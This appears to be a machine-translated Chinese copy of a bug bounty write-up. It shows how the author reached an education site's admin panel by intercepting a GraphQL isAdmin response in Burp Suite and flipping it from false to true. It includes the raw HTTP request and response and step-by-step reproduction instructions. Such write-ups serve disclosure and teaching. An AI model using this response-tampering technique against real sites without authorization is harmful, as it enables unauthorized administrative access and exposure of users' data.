# 另一个管理面板

> 原文：<https://infosecwriteups.com/another-admin-panel-e0489dc76678?source=collection_archive---------0----------------------->

祝你平安。(愿你平安)。

我带着另一篇报道回来了，我希望你们正在狩猎并获得赏金。这一次，我能够在 [graphql](https://graphql.org/) 的帮助下访问管理面板。我们开始吧。

在这篇文章中，我以 target.com 为例。我正在逐个测试 target.com 的子域，然后我来到了 education.target.com 的这个子域。这是某种教育页面，学生可以登录并观看讲座。

**攻击**

当我作为普通用户登录时，我看到登录功能和学生教育页面可用的页面，我打开我的 burp 套件并刷新页面，以查看对服务器的请求。在那之后，可以看到 [graphql](https://graphql.org/) 由于某种原因向 api 端点发出请求。

**请求**

```
POST /api/graphql HTTP/1.1Host: education.target.com
                                                                           User-Agent: Mozilla/5.0 Gecko/20100101 Firefox/91.0
Accept: */*Cookie: a0:state=YOUR Cookie{"operationName":"isAdmin","variables":{},"query":"query isAdmin {\n  isAdmin\n}\n"}
```

我在 burp suite 中右键单击请求->执行拦截->对此请求的响应

**回应**

```
HTTP/1.1 200 OK
Server: nginx/1.19.1
Date: Sat, 04 Sep 2021 04:47:05 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 27
Connection: close
access-control-allow-origin: *
access-control-allow-credentials: true
etag: W/"1b-fPOq3WJkZQ0rkaalpPwLwZziKSQ"
Vary: Accept-Encoding
Strict-Transport-Security: max-age=15724800; includeSubDomains

{"data":{"isAdmin":false}} <-- I just change this to this -> isAdmin":true
```

我可以进入管理面板。在那里，我可以添加讲座并查看所有学生的名单。

# 复制步骤

1.  转到这个网址 education.target.com
2.  使用您的凭据登录:
3.  之后，刷新页面并在 burp suite 中捕获请求，转发每个请求，直到您看到以下请求:

```
POST /api/graphql HTTP/1.1Host: education.target.com
                                                                           User-Agent: Mozilla/5.0 Gecko/20100101 Firefox/91.0
Accept: */*Cookie: a0:state=YOUR Cookie{"operationName":"isAdmin","variables":{},"query":"query isAdmin {\n  isAdmin\n}\n"}
```

4.右键单击请求->拦截->响应此请求

5.之后，您将在您的打嗝套件中看到以下回应:

```
HTTP/1.1 200 OK
Server: nginx/1.19.1
Date: Sat, 04 Sep 2021 04:47:05 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 27
Connection: close
access-control-allow-origin: *
access-control-allow-credentials: true
etag: W/"1b-fPOq3WJkZQ0rkaalpPwLwZziKSQ"
Vary: Accept-Encoding
Strict-Transport-Security: max-age=15724800; includeSubDomains

{"data":{"isAdmin":false}}
```

6.将“isAdmin: false”更改为“isAdmin: true”并发送请求

7.回到你的浏览器，你会在主页上看到管理面板。

主要漏洞存在于 [graphql](https://graphql.org/) 中。仅仅因为 [graphql](https://graphql.org/) 实现中的错误配置，攻击者就能够访问管理面板。

# 外卖食品

始终检查登录页面上的每个请求，尤其是 [graphql](https://graphql.org/) 页面。

由于公司隐私，我没有附上管理面板页面的截图。